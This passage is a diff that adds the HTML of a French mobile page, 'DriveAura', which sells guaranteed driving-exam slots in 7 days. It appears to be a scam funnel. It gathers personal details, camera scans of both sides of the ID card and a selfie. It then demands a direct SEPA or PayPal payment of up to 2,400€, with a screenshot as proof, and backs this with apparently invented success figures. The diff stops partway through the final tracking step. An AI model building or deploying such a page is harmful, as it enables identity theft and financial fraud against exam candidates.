@@ -1,0 +1,944 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<script src="/config.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>DriveAura — Votre permis en 7 jours</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Syne:wght@700;800&display=swap');
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;}
+html,body{height:100%;overflow-x:hidden;}
+body{font-family:'Inter',sans-serif;background:#060d1a;color:#e8eaf0;touch-action:pan-y;}
+.font-syne{font-family:'Syne',sans-serif;}
+
+/* Gradient bg */
+.bg-scene{background:radial-gradient(ellipse 80% 60% at 50% -10%,rgba(14,100,255,0.15) 0%,transparent 70%),#060d1a;}
+
+/* Steps */
+.step{display:none;animation:fadeUp .35s ease both;}
+.step.active{display:flex;flex-direction:column;}
+@keyframes fadeUp{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:translateY(0);}}
+
+/* Nav dots */
+.dot{width:6px;height:6px;border-radius:50%;background:#1e3a5f;transition:all .3s;}
+.dot.done{background:#0ea5e9;width:18px;border-radius:3px;}
+.dot.active{background:#38bdf8;box-shadow:0 0 8px #38bdf8;}
+
+/* CTA button */
+.btn-cta{background:linear-gradient(135deg,#0ea5e9,#0284c7);border-radius:16px;padding:18px 24px;font-weight:700;font-size:15px;letter-spacing:.5px;color:#fff;border:none;cursor:pointer;width:100%;transition:all .25s;box-shadow:0 8px 32px rgba(14,165,233,.35);}
+.btn-cta:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(14,165,233,.5);}
+.btn-cta:active{transform:scale(.97);}
+.btn-secondary{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:14px;padding:14px 24px;font-weight:500;font-size:14px;color:#94a3b8;cursor:pointer;width:100%;transition:all .2s;}
+.btn-secondary:active{opacity:.7;}
+
+/* Offer cards */
+.offer-card{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:20px;padding:16px;cursor:pointer;transition:all .25s;display:flex;align-items:center;gap:14px;}
+.offer-card:active{scale:.97;}
+.offer-card.selected{background:rgba(14,165,233,.1);border-color:#0ea5e9;box-shadow:0 0 0 1px #0ea5e9,0 8px 32px rgba(14,165,233,.15);}
+.offer-icon{width:48px;height:48px;border-radius:14px;background:rgba(14,165,233,.12);display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+
+/* Inputs */
+.field{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:14px;padding:14px 16px;color:#e8eaf0;font-size:15px;width:100%;transition:all .25s;-webkit-appearance:none;outline:none;}
+.field:focus{border-color:#0ea5e9;background:rgba(14,165,233,.07);box-shadow:0 0 0 3px rgba(14,165,233,.15);}
+.field::placeholder{color:#3d5068;}
+.field-label{font-size:12px;font-weight:600;color:#64748b;letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px;}
+
+/* Camera */
+.cam-slot{background:rgba(255,255,255,.03);border:1.5px dashed rgba(255,255,255,.12);border-radius:20px;overflow:hidden;position:relative;transition:all .3s;}
+.cam-slot.captured{border-color:#10b981;border-style:solid;}
+.cam-slot.active-cam{border-color:#0ea5e9;border-style:solid;box-shadow:0 0 0 3px rgba(14,165,233,.15);}
+.scan-anim{position:absolute;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,#0ea5e9,transparent);animation:scanY 1.5s linear infinite;pointer-events:none;}
+@keyframes scanY{0%{top:0%}100%{top:100%}}
+video,canvas{width:100%;height:100%;object-fit:cover;display:block;}
+
+/* Payment copy btn */
+.copy-btn{font-size:11px;padding:5px 12px;border-radius:8px;border:1px solid rgba(14,165,233,.4);color:#38bdf8;background:rgba(14,165,233,.08);cursor:pointer;transition:all .2s;white-space:nowrap;}
+.copy-btn.copied{border-color:#10b981;color:#10b981;background:rgba(16,185,129,.1);}
+
+/* Payment method */
+.method-card{background:rgba(255,255,255,.04);border:1.5px solid rgba(255,255,255,.08);border-radius:18px;padding:16px;cursor:pointer;transition:all .25s;flex:1;text-align:center;}
+.method-card.selected{background:rgba(14,165,233,.1);border-color:#0ea5e9;}
+
+/* Trust badges */
+.trust-pill{display:inline-flex;align-items:center;gap:6px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);border-radius:999px;padding:6px 14px;font-size:12px;color:#94a3b8;}
+
+/* Upload zone */
+.upload-zone{background:rgba(255,255,255,.03);border:1.5px dashed rgba(255,255,255,.12);border-radius:18px;padding:28px 16px;text-align:center;cursor:pointer;transition:all .3s;}
+.upload-zone.has-file{border-color:#10b981;border-style:solid;background:rgba(16,185,129,.05);}
+
+/* Status orb */
+.orb{width:14px;height:14px;border-radius:50%;}
+.orb-pending{background:#f59e0b;box-shadow:0 0 10px #f59e0b;}
+.orb-ok{background:#10b981;box-shadow:0 0 20px #10b981;animation:orbPulse 1.5s infinite;}
+.orb-ko{background:#ef4444;box-shadow:0 0 10px #ef4444;}
+@keyframes orbPulse{0%,100%{box-shadow:0 0 10px #10b981}50%{box-shadow:0 0 30px #10b981,0 0 60px #10b981}}
+
+/* Avatar social proof */
+.avatar{width:28px;height:28px;border-radius:50%;border:2px solid #060d1a;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;margin-left:-8px;}
+
+/* Grid subtle */
+.grid-bg{background-image:linear-gradient(rgba(14,165,233,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(14,165,233,.03) 1px,transparent 1px);background-size:48px 48px;}
+
+::-webkit-scrollbar{width:3px;}
+::-webkit-scrollbar-thumb{background:#1e3a5f;border-radius:2px;}
+input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none;}
+select.field option{background:#0d1f35;}
+
+.progress-bar{height:2px;background:rgba(255,255,255,.06);border-radius:1px;overflow:hidden;margin-bottom:20px;}
+.progress-fill{height:100%;background:linear-gradient(90deg,#0ea5e9,#38bdf8);border-radius:1px;transition:width .4s ease;}
+
+/* Badge live */
+.badge-live{display:inline-flex;align-items:center;gap:6px;background:rgba(14,165,233,.1);border:1px solid rgba(14,165,233,.3);border-radius:999px;padding:6px 14px;font-size:12px;font-weight:600;color:#38bdf8;}
+.badge-dot{width:6px;height:6px;border-radius:50%;background:#38bdf8;animation:blink 1.2s infinite;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+</style>
+</head>
+<body class="bg-scene grid-bg">
+
+<!-- HEADER -->
+<header class="fixed top-0 left-0 right-0 z-50 px-5 pt-safe" style="padding-top:max(16px,env(safe-area-inset-top))">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-2">
+      <div style="width:32px;height:32px;background:linear-gradient(135deg,#0ea5e9,#0284c7);border-radius:10px;display:flex;align-items:center;justify-content:center;">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" fill="white"/></svg>
+      </div>
+      <span class="font-syne font-bold text-white text-base tracking-tight">Drive<span style="color:#38bdf8">Aura</span></span>
+    </div>
+    <!-- Progress dots -->
+    <div class="flex items-center gap-2" id="navDots">
+      <div class="dot active" id="d1"></div>
+      <div class="dot" id="d2"></div>
+      <div class="dot" id="d3"></div>
+      <div class="dot" id="d4"></div>
+      <div class="dot" id="d5"></div>
+      <div class="dot" id="d6"></div>
+      <div class="dot" id="d7"></div>
+    </div>
+  </div>
+</header>
+
+<div style="height:60px"></div>
+
+<!-- ══════════════════════════════════════
+     ÉTAPE 1 — LANDING
+══════════════════════════════════════ -->
+<div id="step1" class="step active min-h-screen px-5 pt-8 pb-10 justify-between">
+  <div class="flex flex-col items-center text-center gap-5 flex-1 justify-center">
+
+    <!-- Badge -->
+    <div class="badge-live">
+      <span class="badge-dot"></span>
+      ACCÈS PRIORITAIRE OUVERT
+    </div>
+
+    <!-- Hero title -->
+    <div>
+      <h1 class="font-syne font-bold leading-tight text-white" style="font-size:clamp(28px,8vw,42px)">
+        Votre place d'examen<br>pratique en
+        <span style="color:#38bdf8"> 7 jours</span><br>garantis.
+      </h1>
+    </div>
+
+    <!-- Subtitle -->
+    <p style="color:#64748b;font-size:15px;line-height:1.6;max-width:320px;">
+      Résolution du blocage ANTS&nbsp;/&nbsp;SNTS. La conciergerie administrative que les auto-écoles ne vous offrent pas.
+    </p>
+
+    <!-- Social proof -->
+    <div class="flex items-center gap-3">
+      <div class="flex items-center">
+        <div class="avatar" style="background:#e879f9;margin-left:0">F</div>
+        <div class="avatar" style="background:#818cf8">S</div>
+        <div class="avatar" style="background:#fb923c">M</div>
+        <div class="avatar" style="background:#34d399">K</div>
+        <div class="avatar" style="background:#60a5fa">+</div>
+      </div>
+      <div style="text-align:left">
+        <div style="font-weight:700;color:#e8eaf0;font-size:14px">847 candidats ce mois</div>
+        <div style="color:#64748b;font-size:12px">Taux de réussite 98.4%</div>
+      </div>
+    </div>
+
+    <!-- CTA -->
+    <div style="width:100%;max-width:360px">
+      <button onclick="goTo(2)" class="btn-cta" style="font-size:15px;letter-spacing:.8px">
+        COMMENCER MA DEMANDE &nbsp;›
+      </button>
+    </div>
+
+    <!-- Trust row -->
+    <div class="flex items-center gap-3 flex-wrap justify-center">
+      <span class="trust-pill">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        Sécurisé
+      </span>
+      <span class="trust-pill">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+        4.9 / 5
+      </span>
+      <span class="trust-pill">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+        7 jours max
+      </span>
+    </div>
+  </div>
+
+  <!-- Footer hint -->
+  <div style="text-align:center;color:#1e3a5f;font-size:11px;padding-top:16px">
+    DriveAura SAS — SIREN 102 554 995 — autoecole-driveaura.fun
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     ÉTAPE 2 — OFFRES
+══════════════════════════════════════ -->
+<div id="step2" class="step px-5 pt-6 pb-10 gap-6">
+  <div>
+    <h2 class="font-syne font-bold text-white text-2xl mb-1">Choisissez votre permis</h2>
+    <p style="color:#64748b;font-size:14px">Résultat garanti en <span style="color:#38bdf8;font-weight:600">7 jours ouvrés</span></p>
+  </div>
+  <div style="display:flex;flex-direction:column;gap:12px">
+    <div class="offer-card" onclick="selectOffer(this,'permis-b','Permis B — Manuel / Automatique')">
+      <div class="offer-icon">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="1.8"><path d="M5 17H3a2 2 0 01-2-2v-3a2 2 0 012-2h1l2-4h10l2 4h1a2 2 0 012 2v3a2 2 0 01-2 2h-2"/><circle cx="7.5" cy="17.5" r="2.5"/><circle cx="16.5" cy="17.5" r="2.5"/></svg>
+      </div>
+      <div style="flex:1">
+        <div style="font-weight:700;color:#e8eaf0;font-size:15px">Permis B</div>
+        <div style="color:#64748b;font-size:13px">Manuel / Automatique</div>
+        <div style="color:#10b981;font-size:12px;margin-top:2px;display:flex;align-items:center;gap:4px">
+          <svg width="10" height="10" viewBox="0 0 24 24" fill="#10b981"><path d="M20 6L9 17l-5-5"/></svg>Garanti 7 jours
+        </div>
+      </div>
+      <div style="text-align:right">
+        <div class="font-syne font-bold" id="price-permis-b" style="color:#38bdf8;font-size:20px">1 250€</div>
+      </div>
+    </div>
+
+    <div class="offer-card" onclick="selectOffer(this,'permis-moto','Permis Moto — A / A2')">
+      <div class="offer-icon">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="1.8"><circle cx="5.5" cy="17.5" r="3.5"/><circle cx="18.5" cy="17.5" r="3.5"/><path d="M15 6h-2l-3 6H5.5"/><path d="M15 6l3 3-2 2.5"/><path d="M12.5 12H18.5"/></svg>
+      </div>
+      <div style="flex:1">
+        <div style="font-weight:700;color:#e8eaf0;font-size:15px">Permis Moto</div>
+        <div style="color:#64748b;font-size:13px">A / A2</div>
+        <div style="color:#10b981;font-size:12px;margin-top:2px;display:flex;align-items:center;gap:4px">
+          <svg width="10" height="10" viewBox="0 0 24 24" fill="#10b981"><path d="M20 6L9 17l-5-5"/></svg>Garanti 7 jours
+        </div>
+      </div>
+      <div style="text-align:right">
+        <div class="font-syne font-bold" id="price-permis-moto" style="color:#38bdf8;font-size:20px">850€</div>
+      </div>
+    </div>
+
+    <div class="offer-card" onclick="selectOffer(this,'poids-lourd','Permis Poids Lourd — C / CE + FIMO')">
+      <div class="offer-icon">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="1.8"><rect x="1" y="3" width="14" height="13" rx="2"/><path d="M15 8h3.5l2.5 3v4h-6V8z"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>
+      </div>
+      <div style="flex:1">
+        <div style="font-weight:700;color:#e8eaf0;font-size:15px">Poids Lourd</div>
+        <div style="color:#64748b;font-size:13px">C / CE + FIMO incluse</div>
+        <div style="color:#10b981;font-size:12px;margin-top:2px;display:flex;align-items:center;gap:4px">
+          <svg width="10" height="10" viewBox="0 0 24 24" fill="#10b981"><path d="M20 6L9 17l-5-5"/></svg>Garanti 7 jours
+        </div>
+      </div>
+      <div style="text-align:right">
+        <div class="font-syne font-bold" id="price-poids-lourd" style="color:#38bdf8;font-size:20px">2 400€</div>
+      </div>
+    </div>
+
+    <div class="offer-card" onclick="selectOffer(this,'vtc-taxi','Transport de Personnes — VTC / Taxi')">
+      <div class="offer-icon">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="1.8"><rect x="1" y="9" width="22" height="9" rx="2"/><path d="M5 9l2-4h10l2 4"/><circle cx="7" cy="18" r="2"/><circle cx="17" cy="18" r="2"/><path d="M10 3h4"/></svg>
+      </div>
+      <div style="flex:1">
+        <div style="font-weight:700;color:#e8eaf0;font-size:15px">VTC / Taxi</div>
+        <div style="color:#64748b;font-size:13px">Transport de personnes</div>
+        <div style="color:#10b981;font-size:12px;margin-top:2px;display:flex;align-items:center;gap:4px">
+          <svg width="10" height="10" viewBox="0 0 24 24" fill="#10b981"><path d="M20 6L9 17l-5-5"/></svg>Garanti 7 jours
+        </div>
+      </div>
+      <div style="text-align:right">
+        <div class="font-syne font-bold" id="price-vtc-taxi" style="color:#38bdf8;font-size:20px">1 800€</div>
+      </div>
+    </div>
+  </div>
+
+  <div id="errOffre" style="color:#ef4444;font-size:13px;text-align:center;display:none">Veuillez sélectionner une offre</div>
+  <button onclick="validateOffer()" class="btn-cta">Continuer</button>
+  <button onclick="goTo(1)" class="btn-secondary">Retour</button>
+</div>
+
+<!-- ══════════════════════════════════════
+     ÉTAPE 3 — INFOS
+══════════════════════════════════════ -->
+<div id="step3" class="step px-5 pt-6 pb-10 gap-6">
+  <div>
+    <h2 class="font-syne font-bold text-white text-2xl mb-1">Informations personnelles</h2>
+    <p style="color:#64748b;font-size:14px">Vos données sont chiffrées et sécurisées</p>
+  </div>
+
+  <div style="display:flex;flex-direction:column;gap:14px">
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+      <div>
+        <div class="field-label">Prénom</div>
+        <input id="prenom" type="text" autocomplete="given-name" class="field" placeholder="Jean">
+      </div>
+      <div>
+        <div class="field-label">Nom</div>
+        <input id="nom" type="text" autocomplete="family-name" class="field" placeholder="Dupont">
+      </div>
+    </div>
+
+    <div>
+      <div class="field-label">Email</div>
+      <input id="email" type="email" autocomplete="email" class="field" placeholder="jean@email.com">
+    </div>
+
+    <div>
+      <div class="field-label">Téléphone</div>
+      <div style="display:flex;gap:8px;align-items:stretch">
+        <div class="field" style="width:auto;padding:14px 12px;display:flex;align-items:center;gap:6px;white-space:nowrap;flex-shrink:0">
+          <span style="font-size:18px">🇫🇷</span>
+          <span style="color:#64748b;font-size:14px">+33</span>
+        </div>
+        <input id="tel" type="tel" inputmode="numeric" maxlength="9" class="field" style="flex:1" placeholder="6 12 34 56 78" oninput="this.value=this.value.replace(/\D/g,'').slice(0,9)">
+      </div>
+      <div style="color:#3d5068;font-size:12px;margin-top:4px">9 chiffres, sans le 0 initial</div>
+    </div>
+
+    <div style="display:grid;grid-template-columns:1fr auto;gap:12px">
+      <div>
+        <div class="field-label">Ville</div>
+        <input id="ville" type="text" autocomplete="address-level2" class="field" placeholder="Paris">
+      </div>
+      <div>
+        <div class="field-label">Code postal</div>
+        <input id="cp" type="tel" inputmode="numeric" maxlength="5" class="field" style="width:100px" placeholder="75001" oninput="this.value=this.value.replace(/\D/g,'').slice(0,5)">
+      </div>
+    </div>
+  </div>
+
+  <div id="errInfos" style="color:#ef4444;font-size:13px;text-align:center;display:none">Veuillez remplir tous les champs correctement</div>
+  <button onclick="validateInfos()" class="btn-cta">Continuer</button>
+  <button onclick="goTo(2)" class="btn-secondary">Retour</button>
+</div>
+
+<!-- ══════════════════════════════════════
+     ÉTAPE 4 — BIOMÉTRIE
+══════════════════════════════════════ -->
+<div id="step4" class="step px-5 pt-6 pb-10 gap-5">
+  <div>
+    <h2 class="font-syne font-bold text-white text-2xl mb-1">Vérification d'identité</h2>
+    <p style="color:#64748b;font-size:14px">Scannez vos documents via la caméra</p>
+  </div>
+
+  <div style="background:rgba(14,165,233,.07);border:1px solid rgba(14,165,233,.2);border-radius:14px;padding:12px 14px;display:flex;align-items:flex-start;gap:10px">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" style="flex-shrink:0;margin-top:1px"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+    <p style="color:#94a3b8;font-size:13px;line-height:1.5">Données biométriques chiffrées. Conformité RGPD garantie.</p>
+  </div>
+
+  <!-- CNI RECTO -->
+  <div>
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+      <div style="font-weight:600;color:#e8eaf0;font-size:14px">Carte d'identité — Recto</div>
+      <div id="st-recto" style="font-size:12px;color:#3d5068">Non capturé</div>
+    </div>
+    <div class="cam-slot" id="box-recto" style="height:180px">
+      <video id="vid-recto" playsinline autoplay muted style="display:none"></video>
+      <canvas id="cvs-recto" style="display:none"></canvas>
+      <div id="ph-recto" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:8px">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#1e3a5f" stroke-width="1.5"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M7 9h4M7 12h8"/><circle cx="16" cy="9" r="1.5" fill="#1e3a5f"/></svg>
+        <span style="color:#3d5068;font-size:13px">Cliquez sur Scanner</span>
+      </div>
+      <div class="scan-anim" id="scan-recto" style="display:none"></div>
+    </div>
+    <button id="btn-recto" onclick="startCam('recto')" style="margin-top:8px;width:100%;padding:13px;border-radius:14px;border:1.5px solid rgba(14,165,233,.35);background:rgba(14,165,233,.07);color:#38bdf8;font-size:14px;font-weight:600;cursor:pointer;">
+      Scanner le recto
+    </button>
+  </div>
+
+  <!-- CNI VERSO -->
+  <div>
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+      <div style="font-weight:600;color:#e8eaf0;font-size:14px">Carte d'identité — Verso</div>
+      <div id="st-verso" style="font-size:12px;color:#3d5068">Non capturé</div>
+    </div>
+    <div class="cam-slot" id="box-verso" style="height:180px">
+      <video id="vid-verso" playsinline autoplay muted style="display:none"></video>
+      <canvas id="cvs-verso" style="display:none"></canvas>
+      <div id="ph-verso" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:8px">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#1e3a5f" stroke-width="1.5"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M7 9h10M7 12h10M7 15h7"/></svg>
+        <span style="color:#3d5068;font-size:13px">Cliquez sur Scanner</span>
+      </div>
+      <div class="scan-anim" id="scan-verso" style="display:none"></div>
+    </div>
+    <button id="btn-verso" onclick="startCam('verso')" style="margin-top:8px;width:100%;padding:13px;border-radius:14px;border:1.5px solid rgba(14,165,233,.35);background:rgba(14,165,233,.07);color:#38bdf8;font-size:14px;font-weight:600;cursor:pointer;">
+      Scanner le verso
+    </button>
+  </div>
+
+  <!-- SELFIE — portrait box -->
+  <div>
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+      <div style="font-weight:600;color:#e8eaf0;font-size:14px">Photo de vous (Selfie)</div>
+      <div id="st-selfie" style="font-size:12px;color:#3d5068">Non capturé</div>
+    </div>
+    <!-- Portrait 3:4 ratio for selfie -->
+    <div style="display:flex;justify-content:center">
+      <div class="cam-slot" id="box-selfie" style="width:220px;height:293px;position:relative">
+        <video id="vid-selfie" playsinline autoplay muted style="display:none;transform:scaleX(-1)"></video>
+        <canvas id="cvs-selfie" style="display:none"></canvas>
+        <div id="ph-selfie" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:8px">
+          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#1e3a5f" stroke-width="1.5"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4.4 3.6-8 8-8s8 3.6 8 8"/></svg>
+          <span style="color:#3d5068;font-size:13px">Caméra frontale</span>
+        </div>
+        <div class="scan-anim" id="scan-selfie" style="display:none"></div>
+        <!-- Face guide overlay -->
+        <div id="face-guide" style="display:none;position:absolute;inset:0;pointer-events:none;align-items:center;justify-content:center">
+          <div style="width:130px;height:170px;border:2px solid rgba(14,165,233,.5);border-radius:65px/85px"></div>
+        </div>
+      </div>
+    </div>
+    <button id="btn-selfie" onclick="startCam('selfie')" style="margin-top:8px;width:100%;padding:13px;border-radius:14px;border:1.5px solid rgba(14,165,233,.35);background:rgba(14,165,233,.07);color:#38bdf8;font-size:14px;font-weight:600;cursor:pointer;">
+      Prendre le selfie
+    </button>
+  </div>
+
+  <div id="errBio" style="color:#ef4444;font-size:13px;text-align:center;display:none">Veuillez capturer les 3 éléments</div>
+  <button onclick="validateBio()" class="btn-cta">Continuer</button>
+  <button onclick="goTo(3)" class="btn-secondary">Retour</button>
+</div>
+
+<!-- ══════════════════════════════════════
+     ÉTAPE 5 — PAIEMENT
+══════════════════════════════════════ -->
+<div id="step5" class="step px-5 pt-6 pb-10 gap-5">
+  <div>
+    <h2 class="font-syne font-bold text-white text-2xl mb-1">Paiement</h2>
+    <p style="color:#64748b;font-size:14px">Sélectionnez votre méthode de paiement</p>
+  </div>
+
+  <div style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:18px;padding:16px;display:flex;align-items:center;justify-content:space-between">
+    <div>
+      <div style="color:#64748b;font-size:12px">Offre choisie</div>
+      <div style="color:#e8eaf0;font-weight:600;font-size:14px;margin-top:2px" id="recap-offre">—</div>
+    </div>
+    <div class="font-syne font-bold" style="color:#38bdf8;font-size:22px" id="recap-prix">—</div>
+  </div>
+
+  <div style="background:rgba(14,165,233,.07);border:1px solid rgba(14,165,233,.2);border-radius:14px;padding:14px">
+    <p style="color:#94a3b8;font-size:13px;line-height:1.6">Pour garantir le délai de <strong style="color:#38bdf8">7 jours ouvrés</strong>, nous exigeons un paiement direct afin d'éviter les lenteurs bancaires.</p>
+  </div>
+
+  <!-- Method selection -->
+  <div style="display:flex;gap:12px">
+    <div class="method-card" id="m-sepa" onclick="selectMethod('sepa')">
+      <div style="margin-bottom:8px;display:flex;justify-content:center">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="1.5"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
+      </div>
+      <div style="font-weight:700;color:#e8eaf0;font-size:13px">Virement SEPA</div>
+      <div style="color:#64748b;font-size:11px;margin-top:2px">Bancaire sécurisé</div>
+    </div>
+    <div class="method-card" id="m-paypal" onclick="selectMethod('paypal')">
+      <div style="margin-bottom:8px;display:flex;justify-content:center">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="1.5"><path d="M7 11.5C7 9 8.8 7 11.5 7H16c2.2 0 3.5 1.3 3.5 3.2 0 3-2 5.3-4.5 5.3h-2l-.8 4H8.5l-.3-1.5"/><path d="M4 15.5C4 13 5.8 11 8.5 11H13c2.2 0 3.5 1.3 3.5 3.2 0 3-2 5.3-4.5 5.3H10l-.5 3H6l-.8-4"/></svg>
+      </div>
+      <div style="font-weight:700;color:#e8eaf0;font-size:13px">PayPal</div>
+      <div style="color:#64748b;font-size:11px;margin-top:2px">Transfert immédiat</div>
+    </div>
+  </div>
+
+  <!-- SEPA details -->
+  <div id="sepa-details" style="display:none;flex-direction:column;gap:10px">
+    <div style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:14px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+        <span style="color:#64748b;font-size:12px;text-transform:uppercase;letter-spacing:.5px">Bénéficiaire</span>
+        <button class="copy-btn" id="cp-benef" onclick="doCopy('val-benef','cp-benef')">Copier</button>
+      </div>
+      <div id="val-benef" style="color:#e8eaf0;font-weight:600;font-size:15px">—</div>
+    </div>
+    <div style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:14px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+        <span style="color:#64748b;font-size:12px;text-transform:uppercase;letter-spacing:.5px">IBAN</span>
+        <button class="copy-btn" id="cp-iban" onclick="doCopy('val-iban','cp-iban')">Copier</button>
+      </div>
+      <div id="val-iban" style="color:#e8eaf0;font-family:monospace;font-size:14px;word-break:break-all">—</div>
+    </div>
+    <div style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:14px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+        <span style="color:#64748b;font-size:12px;text-transform:uppercase;letter-spacing:.5px">BIC / SWIFT</span>
+        <button class="copy-btn" id="cp-bic" onclick="doCopy('val-bic','cp-bic')">Copier</button>
+      </div>
+      <div id="val-bic" style="color:#e8eaf0;font-family:monospace;font-size:15px">—</div>
+    </div>
+  </div>
+
+  <!-- PayPal details -->
+  <div id="paypal-details" style="display:none">
+    <div style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:14px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+        <span style="color:#64748b;font-size:12px;text-transform:uppercase;letter-spacing:.5px">Lien PayPal</span>
+        <button class="copy-btn" id="cp-paypal" onclick="doCopy('val-paypal','cp-paypal')">Copier</button>
+      </div>
+      <a id="val-paypal" href="#" target="_blank" style="color:#38bdf8;font-size:14px;word-break:break-all">—</a>
+    </div>
+  </div>
+
+  <!-- Proof upload -->
+  <div>
+    <div class="field-label" style="margin-bottom:8px">Preuve de paiement (obligatoire)</div>
+    <label class="upload-zone" id="upload-zone">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="1.5" style="margin:0 auto 8px"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+      <div style="color:#94a3b8;font-size:14px;font-weight:500">Appuyez pour importer</div>
+      <div style="color:#3d5068;font-size:12px;margin-top:4px">Capture d'écran du paiement</div>
+      <div id="proof-name" style="color:#10b981;font-size:13px;margin-top:6px;display:none"></div>
+      <input type="file" id="proof-input" accept="image/*" style="display:none" onchange="handleProof(this)">
+    </label>
+  </div>
+
+  <div id="errPay" style="color:#ef4444;font-size:13px;text-align:center;display:none">Sélectionnez une méthode et importez la preuve</div>
+  <button onclick="validatePayment()" class="btn-cta">Continuer</button>
+  <button onclick="goTo(4)" class="btn-secondary">Retour</button>
+</div>
+
+<!-- ══════════════════════════════════════
+     ÉTAPE 6 — RÉCAP
+══════════════════════════════════════ -->
+<div id="step6" class="step px-5 pt-6 pb-10 gap-5">
+  <div>
+    <h2 class="font-syne font-bold text-white text-2xl mb-1">Vérification finale</h2>
+    <p style="color:#64748b;font-size:14px">Relisez vos informations avant l'envoi</p>
+  </div>
+  <div id="recap-content" style="display:flex;flex-direction:column;gap:10px"></div>
+  <div id="recap-photos" style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px"></div>
+  <div style="display:flex;gap:12px;margin-top:8px">
+    <button onclick="goTo(5)" class="btn-secondary" style="flex:1">Modifier</button>
+    <button onclick="submitDossier()" id="btn-submit" class="btn-cta" style="flex:2">Envoyer le dossier</button>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     ÉTAPE 7 — TRACKING
+══════════════════════════════════════ -->
+<div id="step7" class="step px-5 pt-8 pb-10 min-h-screen gap-6 items-center justify-center text-center">
+  <div style="position:relative;width:100px;height:100px;margin:0 auto">
+    <div style="position:absolute;inset:0;border-radius:50%;border:1.5px solid rgba(14,165,233,.3);animation:spin 3s linear infinite"></div>
